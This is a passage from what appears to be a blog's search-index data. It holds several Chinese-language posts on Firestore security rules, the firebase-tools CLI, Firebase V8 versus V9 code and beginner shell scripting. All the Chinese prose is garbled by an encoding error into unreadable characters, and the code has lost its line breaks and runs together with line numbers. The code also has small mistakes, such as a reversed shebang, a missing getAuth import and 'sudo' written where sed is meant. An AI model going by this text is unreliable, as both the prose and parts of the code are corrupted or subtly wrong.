å¾Œï¼Œé€™ç¯‡è¦ä¾†è«‡è«‡ã€Œæ¬Šé™æ©Ÿåˆ¶ã€ã€‚ ç°¡å–®ä¾†èªªï¼Œç›®å‰çš„æˆ‘å€‘éƒ½é‚„æ²’æœ‰åšä»»ä½•ã€ŒRuleã€è¨­å®šï¼Œä»£è¡¨ä»»ä½•äººéƒ½å¯ä»¥å° collection &amp; documents åš Read &amp; Write çš„å‹•ä½œï¼Œé€™é¡¯ç„¶æ˜¯ä¸€å€‹å¾ˆå¤§çš„è³‡å®‰å•é¡Œã€‚ å› æ­¤é€™ç¯‡è¦ä¾†ç´€éŒ„ã€Œæ€éº¼è¨­å®šæ¬Šé™ã€é€™ä»¶äº‹ã€‚ é è¨­çš„è¦å‰‡æ‰“é–‹ä½  Firestore çš„ä¸»æ§å°ï¼Œæ‡‰è©²æœƒçœ‹åˆ°ä¸€å€‹ Tab æ˜¯ã€Œè¦å‰‡ã€ï¼Œé»ä¸‹å»å¾Œè©²æœƒçœ‹åˆ°é€™æ®µ codeï¼š 123456789rules_version = '2';service cloud.firestore { match /databases/{database}/documents { match /{document=**} { allow read, write: if request.time &lt; timestamp.date(2022, 7, 25); } }} é€™é‚Šä¸€è¡Œä¸€è¡Œä¾†è§£é‡‹æ¯æ®µçš„æ„æ€ã€‚ 1. rules_version = '2' æ²’ä»€éº¼ï¼Œå°±æ˜¯ç›®å‰ä½¿ç”¨çš„ç‰ˆæœ¬æ˜¯å¹¾è™Ÿã€‚ 2. service cloud.firestore é€™å€‹è¦å‰‡æ˜¯çµ¦å“ªå€‹ sevice ç”¨çš„ï¼Ÿé€™é‚Šæ˜¯ firestore æ‰€ä»¥å°±å¡« firestoreï¼Œå¦‚æœæ˜¯å…¶ä»–çš„ service å°±æœƒæ˜¯å…¶ä»–çš„å€¼ã€‚ 3. match /databases/{database}/documents {...} é€™å€‹ç°¡å–®ä¾†èªªå°±æ˜¯ã€Œdatabases åº•ä¸‹çš„ä»»ä½•è³‡æ–™åº«çš„ documentsã€éƒ½æœƒå¥—ç”¨ {...} ä¸­çš„è¨­å®šï¼Œ{database} è·Ÿè¬ç”¨å­—å…ƒçš„æ„æ€å·®ä¸å¤šã€‚ 4. match /{document=**} {...} è·Ÿä¸Šé¢ä¸€æ¨£ï¼Œä»»ä½•{document=**} éƒ½æœƒå¥—ç”¨ {...} ä¸­çš„è¨­å®šã€‚ 5. allow read, write: if ... é€™é‚Šå°±æ˜¯æ­£å¼çš„è¦å‰‡äº†ï¼Œå¯ä»¥ read å’Œ writeï¼Œç„¶å¾Œåœ¨ timestamp.date(2022, 7, 25) é€™å€‹æ™‚é–“é»ä»¥å‰ã€‚ æ‰€ä»¥é€™ä¸€æ•´æ®µçš„è¦å‰‡å°±æ˜¯ï¼š åœ¨ 2022/07/25 ä¹‹å‰ï¼Œä»»ä½•äººå° firestore åº•ä¸‹çš„ä»»ä½• databaseã€ä»»ä½• documentsï¼Œéƒ½å…·æœ‰ read å’Œ write æ¬Šé™ï¼ˆæ›è¨€ä¹‹å°±æ˜¯å¤§æ”¾é€ï¼‰ã€‚ è¨­å®šè¦å‰‡å…ˆèªªä¸€ä¸‹åŸºæœ¬çš„æ¬Šé™æœ‰ï¼š writeï¼ˆç›´æ¥åŒ…å« createã€deleteã€update çš„æ„æ€ï¼‰ create delete update æ¥è‘—ä¾†çœ‹ code è§£é‡‹ï¼š 123456789rules_version = '2';service cloud.firestore { match /databases/{database}/documents { match /recipes/{document=**} { allow create: if request.auth != null allow read, delete: if request.auth.uid == resource.data.uid } }} 1. match /recipes/{document=**} é€™é‚Šè¦è¨­å®šçš„è¦å‰‡æ˜¯çµ¦ recipes é€™å€‹ collection ç”¨çš„ï¼Œæ‰€ä»¥åŠ ä¸ŠæŒ‡å®šçš„è·¯å¾‘ã€‚ 2. allow create: if request.auth != null æ¢ä»¶ä¸€ï¼šã€Œä½¿ç”¨è€…å¿…é ˆç™»å…¥æ‰å¯ä»¥ createã€ ç°¡å–®ä¾†èªª request åº•ä¸‹æœ‰ä¸€å€‹ auth ç‰©ä»¶ï¼Œé€™å€‹ç‰©ä»¶å°±æ˜¯æˆ‘å€‘æ¯æ¬¡ç™¼ request æ™‚ Firebase è¦æ‹¿ä¾†é©—è­‰çš„ã€ŒJWTã€ï¼Œå¦‚æœé€™å€‹ JWT ä¸åˆæ³•æˆ–æ˜¯ä¸å­˜åœ¨ï¼Œé‚£å°±æœƒé©—è­‰å¤±æ•—ï¼Œåä¹‹äº¦ç„¶ã€‚ æ‰€ä»¥é€™é‚Šåœ¨åšçš„å°±æ˜¯ç¢ºäºº auth æ˜¯å¦æœ‰å€¼ï¼Ÿåªæœ‰åœ¨æœ‰å€¼çš„æƒ…æ³ä¸‹æ‰å…è¨±ä»– createã€‚ 3. allow read, delete: if request.auth.uid == resource.data.uid æ¢ä»¶äºŒï¼šã€Œä½¿ç”¨è€…åªèƒ½ read å’Œ delete è‡ªå·±çš„è³‡æ–™ã€ å‰›æœ‰èªªé auth å°±ä»£è¡¨ JWTï¼Œæ‰€ä»¥å¯ä»¥ç”¨ .uid çš„æ–¹å¼ä¾†è¾¨åˆ¥èº«ä»½ã€‚æ¥è‘— resource çš„éƒ¨åˆ†å…¶å¯¦å°±æ˜¯æŒ‡å­˜è³‡æ–™åº«è£¡çš„è³‡æ–™ã€‚ ä¸€èˆ¬ä¾†èªªåœ¨å­˜è³‡æ–™æ™‚æˆ‘å€‘æœƒé¡å¤–æ·»åŠ ä¸€å€‹ uid ä¾†è¡¨ç¤ºé€™å€‹è³‡æ–™æ˜¯èª°çš„ï¼Ÿæ‰€ä»¥åœ¨é€™é‚Šå°±å¯ä»¥åˆ©ç”¨å®ƒä¾†åˆ¤æ–·é€™ç­†è³‡æ–™æ˜¯ä¸æ˜¯ xxx çš„ï¼Ÿå”¯æœ‰ç¬¦åˆæ¢ä»¶æ™‚æ‰å…è¨±ä»– read å’Œ deleteã€‚ ä»¥ä¸Šå°±æ˜¯åŸºæœ¬çš„æ¬Šé™è¨­ç½®ï¼Œä¸€æ—¦æ²’æœ‰éµå¾ªé€™å€‹è¦å‰‡ï¼Œé‚£å°±æ²’æœ‰è¾¦æ³•åš CRUD çš„å‹•ä½œï¼ŒFirebase æœƒç›´æ¥æ“‹ä¸‹ä¾†ã€‚ ç¸½ä¹‹é€™æ˜¯è »å¥½ç”¨çš„åŠŸèƒ½ï¼Œæˆ‘è¦ºå¾—å¾ˆå€¼å¾—å­¸ç¿’ã€‚","link":"/2022/07/15/firebase-rules/"},{"title":"Firebase-Tools","text":"ç°¡ç¨± CLIã€‚ ç°¡è¿°å¦‚æœæƒ³è¦åœ¨æœ¬åœ°ç«¯è¨­å®š Firebase çš„è¦å‰‡ï¼Œæˆ–è€…æ˜¯éƒ¨ç½²åˆ° Firebase ä¸Šï¼Œéƒ½æœƒéœ€è¦é€éã€ŒFirebase-toolsã€é€™å€‹ CLI å·¥å…·ä¾†å¹«å¿™ï¼Œæ‰€ä»¥é€™ç¯‡å°±ç°¡å–®ä»‹ç´¹ä¸€äº›æµç¨‹ã€‚ æ‡¶äººåŒ…é™„è¨»ï¼šé€™é‚Šç”¨ Mac å¯èƒ½æœƒé‡åˆ°æ¬Šé™å•é¡Œï¼Œæˆ‘çš„è§£æ³•æ˜¯åˆ° ~/.config/configstore æŠŠæ‰€æœ‰ firebase ç›¸é—œçš„æª”æ¡ˆéƒ½é–‹å•Ÿã€Œè®€å¯«ã€æ¬Šé™ï¼Œé€™æ¨£å°±ä¸æœƒä¸€ç›´å½ˆå‡ºæ¬Šé™å•é¡Œäº†ã€‚ 1. å®‰è£ firebase-tools (global) 1npm install -g firebase-tools 2. ç™»å…¥ 1firebase login 3. åˆå§‹åŒ– é¸æ“‡è¦ä½¿ç”¨çš„ firebase åŠŸèƒ½ï¼š 123456789? Which Firebase features do you want to set up for this directory? Press Space to select features, then Enter to confirm your choices. (Press &lt;space&gt; to select, &lt;a&gt; to toggle all, &lt;i&gt; to invert selection, and &lt;enter&gt; to proceed)ance â—‰ Firestore: Configure security rules and indexes files for Firestore â—¯ Functions: Configure a Cloud Functions directory and its filesâ¯â—‰ Hosting: Configure files for Firebase Hosting and (optionally) set up GitHub Action deploys â—¯ Hosting: Set up GitHub Action deploys â—¯ Storage: Configure a security rules file for Cloud Storage â—¯ Emulators: Set up local emulators for Firebase products é¸æ“‡åˆå§‹åŒ–æ–¹æ¡ˆï¼š 12345? Please select an option:â¯ Use an existing project Create a new project Add Firebase to an existing Google Cloud Platform project Don't set up a default project ä½ è¦ç”¨ firebase ä¸Šçš„å“ªå€‹å°ˆæ¡ˆï¼Ÿ 1234? Select a default Firebase project for this directory: cooking-peanu (Cooking PeaNu)â¯ mymoney-2a81c (myMoney) uber-eats-clone-112b1 (uber-eats-clone) ä½ è¦ç”¨å“ªå€‹æª”æ¡ˆä¾†è¨­å®š Rulesï¼Ÿæˆ‘å€‘æ²’æœ‰æ‰€ä»¥ç›´æ¥ Enter è®“ä»–è‡ªå‹•å»ºç«‹ï¼š 123456? What file should be used for Firestore Rules? firestore.rulesFirestore indexes allow you to perform complex queries whilemaintaining performance that scales with the size of the resultset. You can keep index definitions in your project directoryand publish them with firebase deploy. ä½ è¦ç”¨å“ªå€‹æª”æ¡ˆä¾†è¨­å®š indexsï¼Ÿæˆ‘å€‘æ²’æœ‰æ‰€ä»¥ç›´æ¥ Enter è®“ä»–è‡ªå‹•å»ºç«‹ï¼š 1? What file should be used for Firestore indexes? firestore.indexes.json è¦ public å‡ºå»çš„è³‡æ–™å¤¾åç¨±ï¼Ÿé€™é‚Šå°±è¦è‡ªè¡Œè¼¸å…¥äº†ï¼Œå› ç‚º React æ‰“åŒ…å¾Œæœƒæ”¾åˆ° buildï¼Œæ‰€ä»¥é€™é‚Šè¼¸å…¥ buildï¼š 1What do you want to use as your public directory? (public) è¼¸å…¥ build è¦è¨­å®šæˆ SPA å—ï¼Ÿï¼ˆçµ±ä¸€æŒ‡å‘ index.htmlï¼‰ 1? Configure as a single-page app (rewrite all urls to /index.html)? (y/N) è¦ä¸è¦è‡ªå‹•éƒ¨ç½²åˆ° Github ä¸Šï¼Ÿé€™è£¡çœ‹å€‹äººï¼Œæˆ‘æ˜¯é¸ã€ŒNã€ 1? Set up automatic builds and deploys with GitHub? (y/N) éƒ¨ç½²1. å»ºç«‹ bundle å¾Œçš„æª”æ¡ˆ 1npm run build 2. ä¸‹æŒ‡ä»¤ 1firebase deploy å°±æ˜¯é€™éº¼ç°¡å–®ã€‚ å¦å¤–ï¼Œå¦‚æœåªæ˜¯è¦éƒ¨ç½²ä¸€äº› Firebase çš„è¨­å®šæª”å¯ä»¥é€™æ¨£åšï¼š 1234// firestorefirebase deploy --only firestore// storgaefirebase deploy --only storage ä»¥ä¸Šå°±æ˜¯åŸºæœ¬çš„ä½¿ç”¨æ–¹å¼ã€‚","link":"/2022/07/06/firebase-tools-usage/"},{"title":"Firebaseï¼V8 èˆ‡ V9 çš„è¶…ç´šæ¯”ä¸€æ¯”","text":"Different Style. é‡é»V8 è·Ÿ V9 æœ€å¤§çš„å·®åˆ¥åœ¨æ–¼ã€Œæ¨¡çµ„åŒ–ã€ï¼Œåœ¨ V8 ä¸­æˆ‘å€‘é€šå¸¸æ˜¯ç›´æ¥æŠŠæ•´å€‹ firebase ç‰©ä»¶æ‹¿å‡ºä¾†ä½¿ç”¨ï¼Œåƒæ˜¯ï¼š firebase.firestore firebase.auth() Butï¼Œåœ¨ V9 è£¡é¢æŠŠæ¯å€‹æ±è¥¿éƒ½è®Šæˆäº†ã€Œæ¨¡çµ„ã€ï¼Œæ„æ€å°±æ˜¯ä½ è¦æƒ³ä»€éº¼åŠŸèƒ½å°±æ‹¿ä»€éº¼å‡ºä¾†ç”¨ï¼Œåƒæ˜¯ï¼š import { getFirestore } from 'firebase/firestore' import { createUserWithEmailAndPassword } from \"firebase/auth\" æ“šèªª V9 é€™æ¨£çš„æ•ˆèƒ½æœƒæ¯”è¼ƒå¥½ï¼Œå› ç‚º bundle å¾Œçš„é«”ç©æœƒæ¯”è¼ƒå°ä¸€é»ã€‚ åˆå§‹åŒ–è¨­å®šV8ï¼š 1234567891011121314151617181920212223import firebase from 'firebase/app'import 'firebase/firestore'const firebaseConfig = { apiKey: '...', authDomain: '...', projectId: '...', storageBucket: '...', messagingSenderId: '...', appId: '...'}// init firebasefirebase.initializeApp(firebaseConfig)// init servicesconst db = firebase.firestore()const auth = firebase.auth()const storage = firebase.storage()const timestamp = firebase.firestore.Timestampconst filedValue = firebase.firestore.FieldValueexport { db, auth, timestamp, storage, filedValue } V9ï¼š 123456789101112131415161718192021// éœ€å¼•å…¥ç›¸é—œæ¨¡çµ„import { initializeApp } from 'firebase/app'import { getFirestore } from 'firebase/firestore'const firebaseConfig = { apiKey: '...', authDomain: '...', projectId: '...', storageBucket: '...', messagingSenderId: '...', appId: '...'}// init firebaseinitializeApp(firebaseConfig)// init serviceconst db = getFirestore()const auth = getAuth()export { db, auth } è®€å– collectionV8ï¼š 1234567891011121314151617181920import { db } from '../firebase/config'useEffect(() =&gt; { db.collection('books') .get() .then((snapshot) =&gt; { if (snapshot.empty) throw new Error('This collection is empty') const result = [] snapshot.forEach((doc) =&gt; { result.push({ id: doc.id, ...doc.data() }) }) setBooks(result) }) .catch((error) =&gt; { console.log('ERROR', error.message) })}, []) V9ï¼š 123456789101112131415161718192021222324// éœ€å¼•å…¥ç›¸é—œæ¨¡çµ„import { db } from '../firebase/config'import { collection, getDocs } from 'firebase/firestore'useEffect(() =&gt; { // é€™è£¡ä¸ä¸€æ¨£ const ref = collection(db, 'books') // é€™è£¡ä¸ä¸€æ¨£ getDocs(ref) .then((snapshot) =&gt; { if (snapshot.empty) throw new Error('This collection is empty') const result = [] snapshot.forEach((doc) =&gt; { result.push({ id: doc.id, ...doc.data() }) }) setBooks(result) }) .catch((error) =&gt; { console.log('ERROR', error.message) })}, []) Real-Time DataV8ï¼š 123456789101112131415161718192021222324252627282930import { db } from '../firebase/config'export default function Home() { const [books, setBooks] = useState(null) useEffect(() =&gt; { const unsubscribe = db.collection('books').onSnapshot({ next: (snapshot) =&gt; { const result = [] snapshot.docs.forEach((doc) =&gt; { result.push({ ...doc.data(), id: doc.id }) }) setBooks(result) }, error: (error) =&gt; console.log(error.message) }) return () =&gt; unsubscribe() }, []) return ( &lt;div className='App'&gt; {books &amp;&amp; &lt;BookList books={books} /&gt;} &lt;BookForm /&gt; &lt;/div&gt; )} V9ï¼š 12345678910111213141516171819202122232425262728293031323334// éœ€å¼•å…¥ç›¸é—œæ¨¡çµ„import { db } from '../firebase/config'import { collection, getDocs, onSnapshot } from 'firebase/firestore'export default function Home() { const [books, setBooks] = useState(null) useEffect(() =&gt; { // é€™è£¡ä¸ä¸€æ¨£ const ref = collection(db, 'books') // é€™è£¡ä¸ä¸€æ¨£ const unsubscribe = onSnapshot(ref, { next: (snapshot) =&gt; { const result = [] snapshot.forEach((doc) =&gt; { result.push({ id: doc.id, ...doc.data() }) }) setBooks(result) }, error: (error) =&gt; console.log(error.message) }) return () =&gt; unsubscribe() }, []) return ( &lt;div className='App'&gt; {books &amp;&amp; &lt;BookList books={books} /&gt;} &lt;BookForm /&gt; &lt;/div&gt; )} æ–°å¢ documentV8ï¼š 1234567891011121314import { db } from '../firebase/config'const handleSubmit = async (e) =&gt; { e.preventDefault() try { const addedDoc = await db.collection('books').add({ title: newBook }) console.log(addedDoc) setNewBook('') } catch (error) { console.log(error.message) }} V9ï¼š 123456789101112131415161718// éœ€å¼•å…¥ç›¸é—œæ¨¡çµ„import { db } from '../firebase/config'import { addDoc, collection } from 'firebase/firestore'const handleSubmit = async (e) =&gt; { e.preventDefault() const ref = collection(db, 'books') // é€™è£¡ä¸ä¸€æ¨£ try { const addedDoc = await addDoc(ref, { title: newBook }) console.log(addedDoc) setNewBook('') } catch (error) { console.log(error.message) }} åˆªé™¤ documentV8ï¼š 12345import { db } from '../firebase/config'const handleClick = async (id) =&gt; { await db.collection.doc(id).delete()} V9ï¼š 123456789// éœ€å¼•å…¥ç›¸é—œæ¨¡çµ„import { db } from '../firebase/config'import { deleteDoc, doc } from 'firebase/firestore'const handleClick = async (id) =&gt; { // é€™è£¡ä¸ä¸€æ¨£ const ref = doc(db, 'books', id) await deleteDoc(ref)} æ›´æ–° documentV8ï¼š 1234567import { db } from '../firebase/config'const handleUpdate = async (id) =&gt; { db.collection('books').doc(id).update({ price: 100 })} V9ï¼š 12345678910import { db } from '../firebase/config'import { updateDoc } from 'firebase/firestore'const handleUpdate = async (id) =&gt; { // é€™è£¡ä¸ä¸€æ¨£ const ref = doc(db, 'books', id) await updateDoc(ref, { price: 100 })} è¨»å†ŠV8ï¼š 123456789import { auth } from '../firebase/config'const handleSubmit = async () =&gt; { try { const response = await auth.createUserWithEmailAndPassword(email, password) } catch (error) { console.log(error.message) }} V9ï¼š 1234567891011121314// éœ€å¼•å…¥ç›¸é—œæ¨¡çµ„import { auth } from '../firebase/config'import { createUserWithEmailAndPassword } from 'firebase/auth'const handleSubmit = async (e) =&gt; { e.preventDefault() try { // é€™è£¡ä¸ä¸€æ¨£ const response = await createUserWithEmailAndPassword(auth, email, password) console.log('success', response) } catch (error) { console.log(error.message) }} ç™»å…¥V8ï¼š 1234567891011import { auth } from '../firebase/config'const handleSubmit = async (e) =&gt; { e.preventDefault() try { const response = await auth.signInWithEmailAndPassword(email, password) login(response.user) } catch (error) { console.log(error.message) }} V9ï¼š 123456789101112131415// éœ€å¼•å…¥ç›¸é—œæ¨¡çµ„import { auth } from '../firebase/config'import { signInWithEmailAndPassword } from 'firebase/auth'const handleSubmit = async (e) =&gt; { e.preventDefault() try { // é€™è£¡ä¸ä¸€æ¨£ const response = await signInWithEmailAndPassword(auth, email, password) // client state login(response.user) } catch (error) { console.log(error.message) }} ç™»å‡ºV8ï¼š 123456import { auth } from '../firebase/config'const logout = async () =&gt; { await auth.signOut() setUser(null)} V9ï¼š 123456789// éœ€å¼•å…¥ç›¸é—œæ¨¡çµ„import { auth } from '../firebase/config'import { signOut } from 'firebase/auth'const logout = async () =&gt; { // é€™è£¡ä¸ä¸€æ¨£ await signOut(auth) setUser(null)} Real-Time stateV8ï¼š 12345678910111213141516import { auth } from '../firebase/config'useEffect(() =&gt; { const unsubscribe = auth.onAuthStateChanged( (user) =&gt; { console.log('USER', user) setUser(user) unsubscribe() }, (error) =&gt; { console.log(error.message) setUser(null) unsubscribe() } )}, []) V9ï¼š 1234567891011121314151617181920// éœ€å¼•å…¥ç›¸é—œæ¨¡çµ„import { auth } from '../firebase/config'import { onAuthStateChanged } from 'firebase/auth'useEffect(() =&gt; { // é€™è£¡ä¸ä¸€æ¨£ const unsubscribe = onAuthStateChanged( auth, (user) =&gt; { console.log('USER', user) setUser(user) unsubscribe() }, (error) =&gt; { console.log(error.message) setUser(null) unsubscribe() } )}, []) QueryV8ï¼š 123456789101112131415161718192021import { db } from '../firebase/config'useEffect(() =&gt; { let ref = db.collection('books') // é‡é»é€™ä¸€è¡Œ ref = ref.where('uid', '==', user.uid) const unsubscribe = ref.onSnapshot({ next: (snapshot) =&gt; { const result = [] snapshot.forEach((doc) =&gt; { result.push({ id: doc.id, ...doc.data() }) }) setBooks(result) }, error: (error) =&gt; console.log(error.message) }) return () =&gt; unsubscribe()}, [user.uid]) V9ï¼š 1234567891011121314151617181920212223// éœ€å¼•å…¥ç›¸é—œæ¨¡çµ„import { collection, onSnapshot, where, query } from 'firebase/firestore'import { db } from '../firebase/config'useEffect(() =&gt; { let ref = collection(db, 'books') // é‡é»é€™ä¸€è¡Œ ref = query(ref, where('uid', '==', user.uid)) const unsubscribe = onSnapshot(ref, { next: (snapshot) =&gt; { const result = [] snapshot.forEach((doc) =&gt; { result.push({ id: doc.id, ...doc.data() }) }) setBooks(result) }, error: (error) =&gt; console.log(error.message) }) return () =&gt; unsubscribe()}, [user.uid])","link":"/2022/07/09/firebase-v8-and-v9/"},{"title":"æˆ‘çš„ç¬¬ä¸€å€‹ Shell Script","text":"ç¬¬ä¸€æ¬¡å¯« shell scriptã€‚ éŒ¯èª¤æ’é™¤å¦‚æœæ²’è¾¦æ³•æ­£å¸¸åŸ·è¡Œçš„è©±ï¼Œè©¦è©¦çœ‹ï¼š 1chmod +x æª”å.sh æ¥è‘—å†ç”¨ ls æŸ¥çœ‹è¨Šæ¯ä¸­æ˜¯å¦æœ‰å¯«ä¸Š +x çš„åŸ·è¡Œæ¬Šé™ èªæ³•åŸºæœ¬ #! å¾Œé¢æ¥è‘—æ˜¯è¦ç”¨ä»€éº¼ã€Œè§£è­¯å™¨ã€ä¾†è§£è­¯çš„æ„æ€ã€‚æ‰€ä»¥ !#/bin/bash çš„æ„æ€å°±æ˜¯ç”¨ bash é€™å€‹è§£è­¯å™¨ä¾†è§£è­¯ã€‚ # è¨»è§£ $0 shell script çš„æª”å echo $? æª¢æŸ¥ä¸Šä¸€è¡ŒæŒ‡ä»¤çš„åŸ·è¡Œç‹€æ³ï¼ˆDebugï¼‰ï¼š0 ä»£è¡¨æ­£å¸¸ï¼Œå…¶ä»–æ•¸å­—å°±ä»£è¡¨ä¸æ­£å¸¸ é‹ç®— $((é‹ç®—å¼)) åšé‹ç®—å¼çš„å¯«æ³•ã€‚ä¾‹å¦‚ï¼š1 + 1ã€‚æ²’æœ‰é€™æ¨£å¯«çš„è©±æœƒå°å‡ºç´”æ–‡å­— è®Šæ•¸ $è®Šæ•¸åç¨± ${è®Šæ•¸åç¨±} å‘¼å«è®Šæ•¸ï¼ˆè«‹ä¸è¦æ”¾åœ¨å–®å¼•è™Ÿå…§ï¼Œä¸ç„¶æœƒå°å‡ºç´”æ–‡å­—ï¼‰ è®Šæ•¸åç¨±=å€¼ è³¦å€¼ã€‚ç­‰è™Ÿå…©ç«¯ä¸å¯ä»¥æœ‰ç©ºç™½ï¼Œå€¼å¦‚æœæœ‰å«ç©ºç™½è¦è¨˜å¾—ç”¨ã€Œå¼•è™Ÿã€åŒ…ä½ unset è®Šæ•¸åç¨± åˆªé™¤è®Šæ•¸ åƒæ•¸ $1 åŸ·è¡Œæ™‚å‚³å…¥çš„åƒæ•¸ï¼Œ1 ä»£è¡¨ç¬¬ä¸€å€‹ï¼Œ2 ä»£è¡¨ç¬¬äºŒï¼Œä»¥æ­¤é¡æ¨ $@ åŸ·è¡Œæ™‚å‚³å…¥çš„æ‰€æœ‰åƒæ•¸ ç¯„ä¾‹1234567891011121314151617181920# å»ºç«‹è®Šæ•¸name=\"Jim\"# å»ºç«‹è®Šæ•¸ + è³¦å€¼n=10m=5echo é‹ç®—çµæœï¼š$((n+$m))# æª¢æŸ¥ä¸Šä¸€è¡ŒæŒ‡ä»¤echo \"æŸ¥çœ‹æŒ‡ä»¤æ˜¯å¦æ­£å¸¸åŸ·è¡Œï¼š$?\"# å‘¼å«è®Šæ•¸echo \"å‘¼å«è®Šæ•¸ nameï¼š${name}\"echo \"å‘¼å«è®Šæ•¸ nameï¼š$name\"# åˆªé™¤è®Šæ•¸unset nameecho \"åˆªé™¤å¾Œå†å‘¼å«è®Šæ•¸ nameï¼š${name}\"# åƒæ•¸echo \"æª”åï¼š$0\"echo \"åƒæ•¸1ï¼š$1\"echo \"åƒæ•¸2ï¼š$2\"echo \"æ‰€æœ‰åƒæ•¸ï¼š$@\"echo \"æ‰€æœ‰åƒæ•¸ï¼ˆç„¡é–“éš”ï¼‰ï¼š$*\" ç”¨è®Šæ•¸å„²å­˜æŒ‡ä»¤çš„è¼¸å‡ºå€¼ä¾‹å¦‚èªªç”¨ var=curl url æœƒç™¼ç¾è®Šæ•¸æ²’è¾¦æ³•å„²å­˜å›å‚³å€¼ã€‚ å¦‚æœè®Šæ•¸è¦å„²å­˜çš„æ˜¯ã€ŒæŒ‡ä»¤ã€çš„è¼¸å‡ºçµæœï¼Œå¿…é ˆç”¨ ã€Œ`ã€ æˆ–æ˜¯ $() ä¾†åŒ…ä½ï¼š 12res=`curl --silent https://api.github.com/users/aszx87410`echo $res 12res=$(curl --silent https://api.github.com/users/aszx87410)echo $res å–®å¼•è™Ÿè·Ÿåå¼•è™Ÿçš„å·®åˆ¥12345cmd1=\"touch abc.txt\"cmd2=`touch cba.txt`$cmd1$cmd2 é›™å¼•è™Ÿï¼šä½¿ç”¨é›™å¼•è™Ÿè¡¨ç¤ºçš„å‘½ä»¤ä¸æœƒè¢«ç«‹å³åŸ·è¡Œï¼Œç›´åˆ°æ‚¨ä½¿ç”¨ $ è§£æå®ƒæ™‚æ‰æœƒåŸ·è¡Œã€‚ä¾‹å¦‚ï¼Œåœ¨ä¸Šé¢çš„ç¤ºä¾‹ä¸­ï¼Œç•¶æ‚¨ä½¿ç”¨ $cmd1 æ™‚ï¼Œç³»çµ±å°‡åŸ·è¡Œ touch abc.txt å‘½ä»¤ã€‚ åå¼•è™Ÿï¼šä½¿ç”¨åå¼•è™Ÿè¡¨ç¤ºçš„å‘½ä»¤åœ¨å®šç¾©æ™‚å°±æœƒè¢«ç«‹å³åŸ·è¡Œï¼Œä¸¦å°‡çµæœåˆ†é…çµ¦è®Šé‡ã€‚ä¾‹å¦‚ï¼Œåœ¨ä¸Šé¢çš„ç¤ºä¾‹ä¸­ï¼Œç•¶å®šç¾© cmd2 æ™‚ï¼Œç³»çµ±å°‡åŸ·è¡Œ touch cba.txt å‘½ä»¤ï¼Œä¸¦å°‡çµæœåˆ†é…çµ¦ cmd2 è®Šé‡ã€‚å› æ­¤æ‚¨ç„¡éœ€å†ä½¿ç”¨ $ è§£æè®Šé‡ï¼Œå› ç‚ºå®ƒå·²ç¶“åœ¨å®šç¾©æ™‚åŸ·è¡Œã€‚ ç°¡å–®ä¾†èªªï¼Œå¦‚æœå¸Œæœ›åœ¨å®šç¾©å‘½ä»¤æ™‚å°±åŸ·è¡Œï¼Œæ‚¨å¯ä»¥ä½¿ç”¨åå¼•è™Ÿï¼›å¦‚æœæ‚¨å¸Œæœ›åœ¨å®šç¾©å‘½ä»¤åæ‰åŸ·è¡Œå®ƒï¼Œæ‚¨å¯ä»¥ä½¿ç”¨é›™å¼•è™Ÿã€‚ sed -i çš„ç”¨æ³•sed -i æ˜¯ä¸€å€‹å¾ˆæœ‰ç”¨çš„å‘½ä»¤ï¼Œå¯ä»¥åœ¨ shell ä¸­å¿«é€Ÿä¿®æ”¹æ–‡ä»¶ã€‚å®ƒä½¿ç”¨æ­£å‰‡è¡¨é”å¼å°æ–‡ä»¶é€²è¡Œæ›¿æ›ï¼Œä¸¦ä¸”å¯ä»¥åœ¨åŸå§‹æ–‡ä»¶ä¸Šé€²è¡Œä¿®æ”¹ï¼Œå› æ­¤æ‚¨ä¸éœ€è¦é‡æ–°å‰µå»ºä¸€å€‹æ–°æ–‡ä»¶ã€‚ ä¾‹å¦‚ï¼Œå‡è¨­æ‚¨æœ‰ä¸€å€‹åç‚º â€œexample.txtâ€ çš„æ–‡ä»¶ï¼Œå…§å®¹å¦‚ä¸‹ï¼š 12This is a line of text.This is another line of text. å¦‚æœæ‚¨å¸Œæœ›å°‡æ‰€æœ‰çš„ â€œThisâ€ æ›¿æ›ç‚º â€œThatâ€ï¼Œæ‚¨å¯ä»¥ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤ï¼š 1sed -i '' 's/This/That/g' example.txt è¨»ä¸€ï¼šsed -i çš„ i æ˜¯ä»£è¡¨æˆ‘è¦ç›´æ¥å°åŸæœ¬çš„æª”æ¡ˆåšä¿®æ”¹ï¼Œå¦‚æœä¸åŠ é€™å€‹ flag å°±æœƒå»ºç«‹ä¸€å€‹æ–°çš„æª”æ¡ˆã€‚è¨»äºŒï¼šåªæœ‰ Mac ç”¨æˆ¶æ‰éœ€è¦åŠ ä¸Šç¬¬ä¸€å€‹ç©ºå­—ä¸²ï¼Œå› ç‚º Mac çš„ sudo åŠ ä¸Š -i ä»¥å¾Œç¬¬ä¸€å€‹åƒæ•¸æ˜¯ &lt;extension&gt;ï¼Œæ‰€ä»¥ä¸åŠ çš„è©±å°±æœƒå‡ºå•é¡Œã€‚ è©²å‘½ä»¤å°‡åŸ·è¡Œæ­£å‰‡è¡¨é”å¼æ›¿æ›ï¼Œä¸¦å°‡åŸå§‹æ–‡ä»¶ â€œexample.txtâ€ æ›¿æ›ç‚ºï¼š 12That is a line of text.That is another line of text. è«‹æ³¨æ„ï¼Œæ­£å‰‡è¡¨é”å¼çš„æ ¼å¼ç‚ºï¼šs/search_string/replace_string/gï¼Œå…¶ä¸­ g è¡¨ç¤ºå°æ•´å€‹æ–‡ä»¶é€²è¡Œå…¨å±€æ›¿æ›ã€‚ å‚™è¨»å…¶å¯¦é€™å°±å¾ˆåƒæ˜¯åœ¨å¯«å¦å¤–ä¸€ç¨®ç¨‹å¼èªè¨€è€Œå·²ï¼Œå¯ä»¥å­¸çš„èªæ³•é‚„æœ‰è »å¤šçš„ï¼Œæœ‰èˆˆè¶£çš„è©±å°±åƒè€ƒä¸‹é¢çš„åƒè€ƒè³‡æ–™é€£çµï¼Œéƒ½å¯«çš„è »è©³ç´°çš„ã€‚ åƒè€ƒè³‡æ–™Shell Script ç°¡æ˜“ç­†è¨˜ç°¡æ˜ Linux Shell Script å…¥é–€æ•™å­¸","link":"/2021/12/16/first-shell-script/"},{"title":"è§£æ±º Git ä¸­çš„è¡çªï¼ˆConflictï¼‰","text":"åœ¨ å¾è³‡æ–™å¤¾ä¾†ç†è§£åˆ†æ”¯çš„æ¦‚å¿µ 